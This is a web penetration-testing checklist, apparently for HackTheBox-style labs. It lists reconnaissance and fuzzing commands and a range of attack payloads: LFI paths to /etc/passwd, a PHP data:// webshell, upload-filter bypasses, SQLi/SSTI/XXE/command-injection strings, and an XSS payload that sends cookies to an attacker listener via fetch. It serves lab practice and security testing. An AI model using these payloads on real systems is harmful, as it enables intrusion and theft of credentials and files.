# Web Enumeration Checklist

**Author:** Julien Bongars\
**Date:** 2026-01-29 10:54:02
**Path:**

---

# For External

## External Reconnaissance

- [ ] Wayback Machine `https://web.archive.org/web/*/target.htb`
- [ ] Google dorks `site:target.htb filetype:pdf`, `site:target.htb inurl:admin`
- [ ] GitHub search `"target.htb" password`, `"target.htb" api_key`
- [ ] Shodan `ssl:"target.htb"`
- [ ] Certificate transparency logs `crt.sh?q=%.target.htb`

# HTB

## Surface

- [ ] **Open ports?**
  - [ ] nmap `nmap -sC -sV -p '80,443,7000-7100,7443,8000-8100,8443,9000-9100,9443' -oA nmap/web.nmap $IP_ADDRESS`
    - [ ] Any vuln found?
    - [ ] .git
    - [ ] ftp
- [ ] Check /robots.txt
- [ ] Check /sitemap.xml
- [ ] **VHost?**
  - [ ] Check VHosts
    - Using ffuf (fast, preferred) `ffuf -u http://target.htb -H "Host: FUZZ.target.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <SIZE>`
    - Using gobuster `gobuster vhost -u http://target.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain`
- [ ] fingerprint stack, whatweb/wappalyzer
  - whatweb `whatweb -a 3 http://target.htb`
  - wappalyzer (browser extension)
  - nikto `nikto -h http://target.htb`

## Fingerprinting

- [ ] **PHP web?**
  - [ ] Does URL end in `?q=page/home.php` or similar?
    - [ ] LFI `?q=page/../../../../../../../../../../etc/passwd`
    - [ ] PHP injection possible? See: `../enumeration/php/include-page-injection.md`
      - [ ] `?page=php://filter/convert.base64-encode/resource=index`
      - [ ] `?page=php://filter/convert.base64-encode/resource=config`
      - [ ] `?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id`
    - [ ] Can you upload files?
      - [ ] Restrictions on extension?
      - [ ] Restrictions on size?
      - [ ] Try double extension `.php.jpg`
      - [ ] Try null byte `.php%00.jpg`
      - [ ] Try space url encoding`.php%20.jpg`
      - [ ] Can you smuggle a phar and then trigger it with page? See `../infiltration/deserialisation-injection-insecure-deserialisation/php/php-phar-rfi-smuggling.md`
      - [ ] See !FILE_UPLOAwD
  - [ ] Check `/index.php`
  - [ ] Check `/config.php`
  - [ ] Check `/settings.php`
  - [ ] Check `/phpinfo.php`
  - [ ] Common backup patterns: `index.php.bak`, `index.php~`, `index.php.old`, `index.php.save`, `.index.php.swp`
- [ ] Any CMS/CRM/tech name appear?
  - [ ] Any versions / years / links [TAKE NOTE OF THIS]
    - [ ] Take note of this, use `searchsploit` to find potential vulnerabilities
  - [ ] searchsploit for tech `searchsploit <techname>`
  - [ ] Get version (check source, headers, /version, /CHANGELOG.txt, /README.txt)
  - [ ] Google "[tech] [version] exploit"
  - [ ] Check HackTricks `https://book.hacktricks.xyz`
  - [ ] Are you able to change the theme?
    - [ ] See if you can use php injection to create RCE
  - [ ] Are you able to create backups?
  - [ ] Are you able to upload files?
  - [ ] **CMS-Specific Enumeration**
    - **WordPress**: `wpscan --url http://target.htb --enumerate u,p,t`
    - [ ] Check `/wp-admin`, `/wp-content/uploads`, `/wp-config.php.bak`
      - [ ] Are you able to access the admin page?
        - [ ] use `wpscan -e ap` to enumerate all plugins for possible vulnerabilities
    - **Joomla**: `joomscan -u http://target.htb`
      - [ ] Check `/administrator`, `/configuration.php`
    - **Drupal**: `droopescan scan drupal -u http://target.htb`
      - [ ] Check `/?q=admin`, `/user/login`, `CHANGELOG.txt`
    - **Magento**: Check `/admin`, `/downloader`, `/api`
    - **SharePoint**: Check `/_layouts`, `/_vti_bin`
- [ ] Do you have PHP execution?
  - [ ] can you run `<?php phpinfo(); ?>`
  - [ ] can you see list of dangerous functions? See `../infiltration/deserialisation-injection-insecure-deserialisation/php/dangerous-functions.md`
  - [ ] can you run deserialisationn with gadget chain? See `../infiltration/deserialisation-injection-insecure-deserialisation/php/phpggc.md`

## Enumeration

### Subdirectories

- [ ] is there a `/robots.txt`
- [ ] Check static file discovery
  - feroxbuster `feroxbuster -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,zip,bak`
  - gobuster `gobuster dir -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,zip,bak -t 50`
  - ffuf `ffuf -u http://target.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 -e .php,.html,.txt,.zip,.bak`
- [ ] is there `/api/` or similar directory?
- [ ] is there `/version`
- [ ] is there `/version.txt`
- [ ] is there `/status`
- [ ] is there `/ready`
- [ ] is there `/admin`
- [ ] is there `/backup`
- [ ] is there `/.git` - if yes: `git-dumper http://target.htb/.git /tmp/dump`
- [ ] Check `.DS_Store` (Mac), `.svn`, `.bzr`, `.hg`
- [ ] LFI possible `/../../../../../../../../../../etc/passwd`
- [ ] spider explore web directories
  - feroxbuster recursive `feroxbuster -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 3`
  - gobuster recursive `gobuster dir -u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -r`
  - ZAP* preferred but takes a while to run
  - hakrawler `echo http://target.htb | hakrawler -d 3`
- [ ] Check for extensions `feroxbuster -u http://target.com -x txt,config,xml,php,bak,old`

### Other

- [ ] Can you upload files !FILE_UPLOAD?
  - [ ] Restrictions on extension?
  - [ ] Restrictions on size?
  - [ ] Try double extension `.php.jpg`
  - [ ] Try null byte `.php%00.jpg`
  - [ ] Try space url encoding`.php%00.jpg`
  - [ ] Scan for image magick vulnerabilities?
    - [ ] CVE-2016-3714 (in progress...)
    - [ ] CVE-2022-44268
- [ ] Is there a place to insert an IP address?
  - [ ] what happens if you use 127.0.0.1?
  - [ ] what happens if you start nc and use your own IP address?
- [ ] **SPA application?**
  - [ ] Download client source code
    - Browser DevTools > Sources tab > right-click folder > "Save as..."
    - wget mirror `wget -r -np -k http://target.htb/js/`
    - Use browser extension like "Download All Files" or manually save main bundles
    - [ ] scan for vulnerabilities
      - copy source `find ./src -type f \( -name '*.js' -o -name '*.html' -o -name '*.json' \) | xargs cat | pbcopy` then paste to LLM
      - use semgrep to automatically scan source code for velnerabilities.
    - [ ] Hardcoded credentials `grep -r 'password\|apikey\|secret' *.js`
    - [ ] API endpoints `grep -r '/api/' *.js`
    - [ ] Comments with TODO/DEBUG
    - [ ] grep for emails `rg '@.*\.htb'` or `grep -r '@' . | grep -i 'email\|mail'`
    - [ ] grep for API keys `rg -i 'api[_-]?key|token|secret|password' .`
    - [ ] grep for endpoints `rg -i 'https?://|/api/|fetch\(|axios\.' .`
  - [ ] Check localStorage/sessionStorage in DevTools
  - [ ] Check Service Workers `/sw.js`
  - [ ] DOM-based XSS? `#<img src=x onerror=alert(1)>`
  - [ ] Prototype pollution? `?__proto__[admin]=true`
  - [ ] Evidence of SSR? NextJS?
    - [ ] Check `/_next/` directory
    - [ ] Dump context? explore client secrets? Check `__NEXT_DATA__` in page source
    - [ ] Check for .env exposure `/api/.env` or `/.env`

# Exploitation

## User Registration

- [ ] Registration?
- [ ] Create account
  - [ ] User profile?
  - [ ] Create post/article/modify web content?
  - [ ] File upload functionality?
    - [ ] Upload PHP shell? `.php`, `.php5`, `.phtml`, `.phar`
    - [ ] Try double extension `.php.jpg`
    - [ ] Try null byte `.php%00.jpg`
  - [ ] **Authentication/Session**
    - [ ] Check cookies - httpOnly? Secure? SameSite?
    - [ ] JWT token? Decode at jwt.io, try `alg: none`, weak secret bruteforce
    - [ ] Session fixation possible?
    - [ ] Password reset token predictable?
    - [ ] 2FA bypass? Rate limiting on codes?
    - [ ] Default creds for detected tech? `creds.txt`, SecLists default creds
- [ ] Forgot password/way to list users?
  - [ ] Username enumeration via timing/response difference
  - [ ] ffuf usernames `ffuf -request forgot.req -request-proto http -w /usr/share/seclists/Usernames/Names/names.txt -fs <SIZE>`
- [ ] Default credentials? `admin:admin`, `admin:password`, etc.
- [ ] Timing attacks for user enumeration
  - does valid user take longer time to outh than invalid one?
  - ffuf `ffuf -u http://target.htb/login -X POST -d "username=FUZZ&password=test" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -o timing-results.json`
- [ ] CRLF injection? %0d%0aSet-Cookie:admin=true
  - What it is: Carriage Return Line Feed injection - injecting newline characters (\r\n) to break out of one HTTP header and inject new ones.
  - `curl -v "http://target.htb/redirect?url=/%0d%0aSet-Cookie:admin=true"`
  - `curl -v "http://target.htb/page?name=test%0d%0aX-Injected-Header:pwned"`
  - `curl -v "http://target.htb/login?next=/%0d%0aSet-Cookie:session=attacker_controlled_value"`

## Forms

- [ ] **Forms**
  - [ ] Any SSTI? `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `{{config}}`
  - [ ] Any SQL Injection opportunities? `' OR 1=1--`, `admin' --`, test with sqlmap
    - sqlmap `sqlmap -r request.txt --batch --level=5 --risk=3`
  - [ ] Any AJAX captured in BurpSuite?
  - [ ] HTML escaping? `<script>alert(1)</script>` `<img src=x onerror=alert(1)>`
    - [ ] XSS vuln
      - server `nc -lvnp 4444`
      - client `<script>fetch('http://<YOUR-IP>:4444/?c='+document.cookie)</script>`
      - or `<img src=x onerror="fetch('http://<YOUR-IP>:4444/?c='+document.cookie)">`
  - [ ] Any top level data object? Check browser console: `document.data`, `window.app`, `window.config`
  - [ ] Command injection? `; id`, `| whoami`, `&& ls`, backticks
  - [ ] File inclusion? Check parameters for file paths, try LFI/RFI

## Other

- [ ] **Advanced Injection Testing**
  - [ ] SSRF? Try `http://localhost`, `http://127.0.0.1`, `http://169.254.169.254/latest/meta-data/` (AWS metadata)
  - [ ] XXE? If XML upload/parsing: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
  - [ ] NoSQL injection? `{"username": {"$ne": null}, "password": {"$ne": null}}`
  - [ ] LDAP injection? `*)(uid=*))(|(uid=*`
  - [ ] Template injection (SSTI)? Try multiple: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`
  - [ ] OS command injection? `;id`, `|whoami`, `&&ls`, \`whoami\`, `$(whoami)`
- [ ] **Error-Based Enumeration**
  - [ ] Force errors to reveal info (stack traces, paths, versions)
  - [ ] Send malformed requests (broken JSON, invalid XML)
  - [ ] Check different error codes (400, 401, 403, 404, 500)
  - [ ] Timing attacks for user enumeration

## API

- [ ] Check response headers
  - [ ] Server version disclosure?
  - [ ] Security headers missing? (CSP, X-Frame-Options, etc.)
  - [ ] Interesting cookies? JWT tokens to decode?
- [ ] API enumeration (if /api/ found)
  - [ ] Swagger/OpenAPI docs? `/api/docs`, `/api/swagger`, `/api/v1/swagger.json`
  - [ ] GraphQL? `/graphql`, `/api/graphql` - try introspection query
  - [ ] REST endpoints? Fuzz for versions `/api/v1/`, `/api/v2/`
  - [ ] IDOR? Try changing IDs in requests
  - [ ] Any endpoint found?
    - Arjun (param discovery) `arjun -u http://target.htb/endpoint`
- [ ] Possibility for SSRF?
  - [ ] what if you change `Referer:` to the following:-
    - [ ] `127.0.0.1`
    - [ ] `(admin|dev|any-vhost-you-find).somebox.htb`
    - [ ] `(admin|dev|any-vhost-you-find).somebox.htb/admin/login?redirect=/admin/` This one probably requires some work
